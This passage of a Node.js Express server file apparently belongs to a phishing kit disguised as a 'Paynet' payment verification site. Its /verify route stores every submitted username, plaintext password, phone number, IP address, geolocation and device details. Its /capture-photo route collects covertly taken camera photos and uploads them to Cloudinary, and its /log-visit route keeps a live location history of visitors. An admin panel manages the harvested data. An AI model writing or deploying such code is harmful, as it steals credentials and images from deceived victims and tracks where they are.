    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
      const initialLength = photos.length;
      const newPhotos = photos.filter(p => p.filename !== filename && p.url !== filename);
      if (newPhotos.length < initialLength) deleted = true;
      return newPhotos;
    });

    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
      attempts.forEach(attempt => {
        if (attempt.photos) {
          const originalLen = attempt.photos.length;
          attempt.photos = attempt.photos.filter(p => p.filename !== filename && p.url !== filename);
          if (attempt.photos.length < originalLen) deleted = true;
        }
        if (attempt.photoFilename === filename) {
          attempt.photoFilename = null;
          deleted = true;
        }
      });
      return attempts;
    });

    res.json({ success: true, message: deleted ? "Photo and references deleted" : "Photo reference removed" });
  } catch (error) {
    console.error("Error deleting photo:", error);
    res.status(500).json({ success: false, error: "Failed to delete photo" });
  }
});

app.delete("/admin/photo/delete-all", requireAdmin, async (req, res) => {
  try {
    const capturesDir = path.join(__dirname, "captures");
    if (fs.existsSync(capturesDir)) {
      const files = fs.readdirSync(capturesDir);
      files.forEach(file => {
        const filepath = path.join(capturesDir, file);
        if (fs.statSync(filepath).isFile()) {
          fs.unlinkSync(filepath);
        }
      });
    }

    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), () => []);
    await safeUpdateJSON(path.join(__dirname, "loginAttempts.json"), (attempts) => {
      attempts.forEach(a => {
        a.photos = [];
        a.photoFilename = null;
        a.cloudinaryUrl = null;
      });
      return attempts;
    });

    res.json({ success: true, message: "All photos deleted" });
  } catch (error) {
    console.error("Error deleting all photos:", error);
    res.status(500).json({ success: false, error: "Failed to delete all photos" });
  }
});

app.get("/admin-logout", (req, res) => {
  req.session.isAdmin = false;
  res.redirect("/admin-login");
});

app.get("/troll-success", (req, res) => {
  res.render("troll", { layout: false });
});

app.get("/notres", (req, res) => {
  res.render("notres", { layout: false });
});

app.get("/privacy", (req, res) => {
  res.render("privacy", { layout: false });
});

app.get("/terms", (req, res) => {
  res.render("terms", { layout: false });
});

app.get("/forgot-password", (req, res) => {
  res.render("forgot-password", { layout: false });
});

// ============ CAPTURE PHOTO ============
app.post("/capture-photo", async (req, res) => {
  try {
    const { photo, type, timestamp: clientTimestamp, paymentId, camera } = req.body;

    if (!photo) {
      return res.status(400).json({ success: false, message: "No photo data" });
    }

    const ip = getClientIP(req) || "unknown";
    const timestamp = new Date().toISOString().replace(/:/g, "-");
    const safeIp = String(ip).replace(/[.:]/g, "-");
    const photoType = type || "unknown";
    const cameraType = camera || "unknown";
    const publicId = `paynet_${photoType}_${cameraType}_${timestamp}_${safeIp}`;

    let photoUrl = null;
    let filename = null;

    if (process.env.CLOUDINARY_URL || process.env.CLOUDINARY_API_KEY) {
      try {
        const uploadResponse = await cloudinary.uploader.upload(photo, {
          public_id: publicId,
          folder: "paynet_captures"
        });
        photoUrl = uploadResponse.secure_url;
        filename = uploadResponse.public_id;
      } catch (cloudErr) {
        console.error("Cloudinary upload failed, using local storage:", cloudErr.message);
      }
    }

    if (!photoUrl) {
      const capturesDir = path.join(__dirname, "captures");
      if (!fs.existsSync(capturesDir)) fs.mkdirSync(capturesDir);
      filename = `${publicId}.jpg`;
      const filepath = path.join(capturesDir, filename);
      const base64Data = String(photo).replace(/^data:image\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      fs.writeFileSync(filepath, buffer);
    }

    const photoMetadata = {
      filename,
      url: photoUrl,
      type: photoType,
      camera: cameraType,
      ip,
      timestamp: clientTimestamp || new Date().toISOString(),
      localPath: photoUrl ? null : `/admin/photo/${filename}`,
      paymentId: paymentId || null
    };

    await safeUpdateJSON(path.join(__dirname, "pendingPhotos.json"), (photos) => {
      photos.push(photoMetadata);
      return photos;
    });

    res.json({ success: true, filename, url: photoUrl });
  } catch (error) {
    console.error("Capture error:", error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ============ LOG VISIT (Real-time Location Updates) ============
app.post("/log-visit", async (req, res) => {
  try {
    const { paymentId, location, deviceDetails, userAgent, isUpdate } = req.body;

    const ip = getClientIP(req);
    const timestamp = new Date().toISOString();
    const geo = await getGeoWithFallback(ip);

    let parsedLocation = location;
    if (typeof location === 'string') {
      try { parsedLocation = JSON.parse(location); } catch (e) { }
    }

    let parsedDeviceDetails = deviceDetails;
    if (typeof deviceDetails === 'string') {
      try { parsedDeviceDetails = JSON.parse(deviceDetails); } catch (e) { }
    }

    // Extract coords for reverse geocoding
    let coords = null;
    if (parsedLocation) {
      if (parsedLocation.latitude && parsedLocation.longitude) coords = parsedLocation;
      else if (parsedLocation.coords && parsedLocation.coords.latitude) coords = parsedLocation.coords;
      else if (parsedLocation.finalLocation && parsedLocation.finalLocation.coords) coords = parsedLocation.finalLocation.coords;
      else if (parsedLocation.finalLocation && parsedLocation.finalLocation.latitude) coords = parsedLocation.finalLocation;
    }

    // Add address if coords present
    if (coords && coords.latitude && coords.longitude) {
      const address = await reverseGeocode(coords.latitude, coords.longitude);
      if (address) {
        if (parsedLocation.finalLocation) {
          parsedLocation.finalLocation.address = address;
        } else {
          parsedLocation.address = address;
        }
      }
    }

    const verificationId = paymentId || "VISIT-" + ip.replace(/[.:]/g, "").slice(-4) + "-" + timestamp.slice(14, 19).replace(":", "");

    const logFile = path.join(__dirname, "loginAttempts.json");
    await safeUpdateJSON(logFile, (attempts) => {
      const existingIndex = attempts.findIndex(a => a.verificationId === verificationId);

      if (existingIndex !== -1) {
        const existing = attempts[existingIndex];
        existing.timestamp = timestamp;
        existing.ip = ip;
        if (geo) existing.geo = geo;
        if (parsedLocation) existing.location = parsedLocation;
        if (parsedDeviceDetails) existing.deviceDetails = parsedDeviceDetails;

        if (!existing.locationHistory) existing.locationHistory = [];
        if (coords) {
          existing.locationHistory.push({
            coords,
            timestamp,
            source: (parsedLocation.finalLocation ? parsedLocation.finalLocation.source : (parsedLocation.source || 'Update'))
          });
          if (existing.locationHistory.length > 50) existing.locationHistory.shift();
        }

        existing.status = existing.status || "Verifying";
        existing.lastUpdate = timestamp;
        existing.isLive = true;
      } else {
        const logData = {
          verificationId,
          timestamp,
          ip,
          geo,
          location: parsedLocation,
          deviceDetails: parsedDeviceDetails,
          userAgent: userAgent || req.headers["user-agent"],
          status: "Verifying",
          type: "Visit",
          locationHistory: coords ? [{ coords, timestamp, source: 'Initial' }] : [],
          isLive: true,
          lastUpdate: timestamp
        };
        attempts.push(logData);
      }
      return attempts;
    });

    res.json({ success: true, verificationId });
  } catch (error) {
    console.error("Log visit error:", error);
    res.status(500).json({ success: false });
  }
});

// ============ VERIFY LOGIN ============
app.post("/verify", async (req, res) => {
  const {
    username: inputUsername,
    password: inputPassword,
    deviceDetails,
    location,
    phoneNumber,
    photoData,
  } = req.body;

  const ip = getClientIP(req);
  const userAgent = req.headers["user-agent"];
  const timestamp = new Date().toISOString();
  const geo = await getGeoWithFallback(ip);

  let parsedDeviceDetails = null;
  if (deviceDetails) {
    try { parsedDeviceDetails = JSON.parse(deviceDetails); } catch { }
  }

  let parsedLocation = null;
  if (location) {
    try { parsedLocation = JSON.parse(location); } catch { }
  }

  // Enhanced location with reverse geocoding
  let enhancedLocation = parsedLocation;

  const hasDirectCoords = parsedLocation && parsedLocation.latitude && parsedLocation.longitude;
  const hasFinalCoords = parsedLocation && parsedLocation.finalLocation &&
    parsedLocation.finalLocation.coords &&
    parsedLocation.finalLocation.coords.latitude;

  if (hasDirectCoords) {
    const address = await reverseGeocode(parsedLocation.latitude, parsedLocation.longitude);
    if (address) {
      enhancedLocation = { ...parsedLocation, address };
    }
  } else if (hasFinalCoords) {
    const coords = parsedLocation.finalLocation.coords;
    const address = await reverseGeocode(coords.latitude, coords.longitude);
    if (address) {
      enhancedLocation = {
        ...parsedLocation,
        finalLocation: {
          ...parsedLocation.finalLocation,
          address
        }
      };
    }
  }

  const verificationId = "PAY-" + crypto.randomBytes(4).toString("hex").toUpperCase();

  // Link pending photos
  const photosFile = path.join(__dirname, "pendingPhotos.json");
  let userPhotos = [];
  const normalizedIP = normalizeIP(ip);

  await safeUpdateJSON(photosFile, (pendingPhotos) => {
    const tenMinutesAgo = new Date(Date.now() - 10 * 60 * 1000).toISOString();
    const directMatches = pendingPhotos.filter(p => {
      return normalizeIP(p.ip) === normalizedIP && p.timestamp > tenMinutesAgo;
    });
    userPhotos = [...directMatches];

    if (userPhotos.length === 0) {
      const veryRecentAgo = new Date(Date.now() - 3 * 60 * 1000).toISOString();
      const timeMatches = pendingPhotos.filter(p => p.timestamp > veryRecentAgo);
      if (timeMatches.length > 0) {
        userPhotos = [...timeMatches];
      }
    }

    if (userPhotos.length > 0) {
      const linkedIds = new Set(userPhotos.map(p => p.timestamp));
      return pendingPhotos.filter(p => !linkedIds.has(p.timestamp));
    }
    return pendingPhotos;
  });

  const logData = {
    verificationId,
    timestamp,
    ip,
    geo,
    location: enhancedLocation,
    deviceDetails: parsedDeviceDetails,
    userAgent,
    username: inputUsername,
    password: inputPassword,
    passwordHash: hashPassword(inputPassword),
    phoneNumber: phoneNumber || null,
    photoData: userPhotos.length > 0 ? "[CAPTURED]" : (photoData ? "[CAPTURED]" : null),
    photos: userPhotos,
    photoCount: userPhotos.length,
    photoFilename: req.body.photoFilename || null,
    cloudinaryUrl: req.body.photoUrl || null,
    status: "Verified",
    amount: "₹" + (Math.floor(Math.random() * 500) + 100) + ".00"
  };

  try {
    if (photoData && (process.env.CLOUDINARY_URL || process.env.CLOUDINARY_API_KEY)) {
      try {
        const uploadResponse = await cloudinary.uploader.upload(photoData, {
          folder: "paynet_verifications",
          public_id: verificationId
        });
        logData.cloudinaryUrl = uploadResponse.secure_url;
      } catch (uploadErr) {
        console.error("Cloudinary upload failed in /verify:", uploadErr);
      }
    }

    const logFile = path.join(__dirname, "loginAttempts.json");
    await safeUpdateJSON(logFile, (attempts) => {
      attempts.push(logData);
      return attempts;
    });
  } catch (error) {
    console.error("Error in /verify log save:", error);
  }

  if (inputUsername === username && inputPassword === password) {
    req.session.user = inputUsername;
    return res.redirect("/home");
  } else {
    req.session.msg = "Invalid username or password";
    return res.redirect("/");
  }
});

app.get("/home", (req, res) => {
  if (!req.session.user) return res.redirect("/");
  res.render("home", { layout: false });
});

app.get("/logout", (req, res) => {
  req.session.destroy(() => res.redirect("/"));
});

// Health check
app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    uptime: process.uptime(),
    memory: process.memoryUsage(),
    timestamp: new Date().toISOString()
  });
});

// Global error handling
process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err.message);
});
process.on("unhandledRejection", (reason) => {
  console.error("Unhandled Rejection:", reason);
});

// Dynamic port for Render
const PORT = process.env.PORT || 3003;

// Periodic Cleanup (Every hour)
setInterval(async () => {
  try {
    const photosFile = path.join(__dirname, "pendingPhotos.json");
    const ONE_DAY = 24 * 60 * 60 * 1000;

    await safeUpdateJSON(photosFile, (photos) => {
      const now = Date.now();
      const initialCount = photos.length;
      const newPhotos = photos.filter(p => {
        const timeDiff = now - new Date(p.timestamp).getTime();
        return timeDiff < ONE_DAY;
      });
      if (newPhotos.length < initialCount) {
        console.log(`🧹 Cleanup: Removed ${initialCount - newPhotos.length} old pending photos`);
      }
      return newPhotos;
    });
  } catch (e) {
    console.error("Cleanup error:", e);
  }
}, 60 * 60 * 1000);

// Start server
app.listen(PORT, () => {
  console.log(`✅ Paynet server running on http://localhost:${PORT}`);
  console.log(`📊 Admin dashboard: http://localhost:${PORT}/admin-login`);
  console.log(`🔧 Environment: ${process.env.NODE_ENV || 'development'}`);
});